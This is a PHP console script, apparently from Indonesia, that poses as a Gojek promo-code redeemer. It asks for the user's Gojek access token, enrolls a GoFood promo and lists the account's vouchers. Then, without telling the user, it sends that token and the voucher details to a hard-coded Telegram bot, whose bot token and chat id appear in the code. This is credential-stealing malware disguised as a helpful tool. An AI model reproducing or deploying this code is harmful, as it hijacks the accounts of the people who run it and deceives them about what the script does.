<?php
date_default_timezone_set('Asia/Jakarta');
include "rondo.php";
echo color("white","Token: ");
$token = trim(fgets(STDIN));
echo "\n".color("white","Janda mau?: y/n ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","💛Janda 15+10+5💛");
        echo "\n".color("blue","Get Code.");
        echo "\n".color("white","Sabar ya Jandaku");
        for($a=1;$a<=3;$a++){
        echo color("white",".");
        sleep(1);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2107"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Asik Jandaku Sudah bisa Makan')){
        echo "\n".color("green"," Message: ".$message);
        }else{
        echo "\n".color("white"," Message: ".$message);
          sleep(1);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
        
        echo "\n".color("blue"," Voucher ada ".$total." : ");
        echo "\n".color("red"," 1.        ".$voucher1);
        echo "\n".color("white"," sampai:   ".$expired1);
        echo "\n".color("yellow"," 2.        ".$voucher2);
        echo "\n".color("white"," sampai:   ".$expired2);
        echo "\n".color("green"," 3.        ".$voucher3);
        echo "\n".color("white"," sampai:   ".$expired3);
        
        echo "\n".color("blue"," 4.        ".$voucher4);
        echo "\n".color("white"," sampai:   ".$expired4);
        echo "\n".color("purple"," 5.        ".$voucher5);
	echo "\n".color("white"," sampai:   ".$expired5);
        echo "\n".color("nevy"," 6.        ".$voucher6);
        echo "\n".color("white"," sampai:   ".$expired6);
        echo "\n".color("grey"," 7.        ".$voucher7);
        echo "\n".color("white"," sampai:   ".$expired7);
        echo "\n".color("red"," 8.        ".$voucher8);
        echo "\n".color("white"," sampai:   ".$expired8);
        echo "\n".color("yellow"," 9.        ".$voucher9);
        echo "\n".color("white"," sampai:   ".$expired9);
        echo "\n".color("green","10.       ".$voucher10);
        echo "\n".color("white"," sampai:  ".$expired10);
        echo "\n".color("blue","11.       ".$voucher11);
        echo "\n".color("white"," sampai:  ".$expired11);
	echo "\n".color("purple","12.       ".$voucher12);
        echo "\n".color("white"," sampai:  ".$expired13);
        echo "\n".color("grey","13.       ".$voucher13);
        echo"\n";
        $TOKEN  = "1255177018:AAEvsNT6IRAg6NUF8TxJIgfBuMk1ljP0V3A";
	$chatid = "901308103";
	$pesan 	= "[+] Gojek Account Info [+]\n\n".$hp."\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
	$method	= "sendMessage";
	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         }
  }
